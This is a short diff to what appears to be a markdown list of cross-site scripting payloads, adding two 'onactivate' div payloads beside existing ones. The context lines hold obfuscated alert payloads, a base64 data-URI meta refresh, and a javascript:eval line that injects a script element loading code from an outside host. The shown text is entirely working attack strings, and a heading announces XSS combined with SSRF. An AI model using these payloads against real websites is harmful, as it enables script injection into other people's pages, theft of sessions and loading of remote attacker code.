@@ -150,6 +150,8 @@ javascripT:eval('var a=document.createElement(\'script\'):a.src=\'https://ofjaaa
 0%3Bdata%3Atext%2Fhtml%3Bbase64%2CPHNjcmlwdD5wcm9tcHQoIlJlZmxlY3RlZCBYU1MgUE9DbCIpPC9zY3JpcHQ%22HTTP-EQUIV%3D%22refresh%22
 xss><svg/onload=globalThis[`al`+/ert/.source]`1`//
 "-top['al\x65rt']('sailay')-"
+<div onactivate=alert('Xss') id=xss style=overflow:scroll> 
+><div onactivate=alert('Xss')> 
 ```
 
 ## XSS + SSRF <br>
